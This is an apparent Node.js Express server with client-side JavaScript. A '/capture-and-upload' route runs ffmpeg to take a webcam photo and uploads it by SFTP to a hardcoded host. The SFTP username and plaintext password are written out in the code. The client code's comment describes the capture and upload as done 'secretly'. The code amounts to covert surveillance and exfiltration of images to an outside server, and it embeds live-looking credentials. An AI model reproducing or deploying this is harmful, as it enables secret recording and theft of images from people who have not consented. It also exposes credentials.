const express = require('express');
const path = require('path');
const { SftpClient } = require('ssh2-sftp-client');
const fs = require('fs');
const { exec } = require('child_process');

const app = express();

// Serve the HTML page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// SFTP configuration
const sftpConfig = {
    host: '10.144.62.220',
    port: 22, // SFTP port
    username: 'tofiqv',
    password: 'aKindT0fiq'
};

// Route to capture and upload the image
app.get('/capture-and-upload', async (req, res) => {
    try {
        // Capture image using webcam
        const imagePath = path.join(__dirname, 'captures', 'captured_image.jpg');
        const captureCommand = `ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -vframes 1 ${imagePath}`;
        exec(captureCommand, async (error, stdout, stderr) => {
            if (error) {
                console.error('Error capturing image:', error);
                res.status(500).send('Error capturing image');
                return;
            }
            
            // Initialize SFTP client
            const sftp = new SftpClient();
            await sftp.connect(sftpConfig);

            // Upload image to the server
            await sftp.put(imagePath, '/home/tofiqv/Desktop/captured_image.jpg');

            // Close the SFTP connection
            await sftp.end();

            // Image uploaded successfully
            res.sendStatus(200);
        });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Serve static files
app.use(express.static('public'));

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
document.getElementById('captureButton').addEventListener('click', function() {
    // Send request to server to capture and upload the image secretly
    fetch('/capture-and-upload')
    .then(response => {
        if (response.ok) {
            console.log('Image captured and uploaded successfully');
        } else {
            console.error('Error capturing or uploading image');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
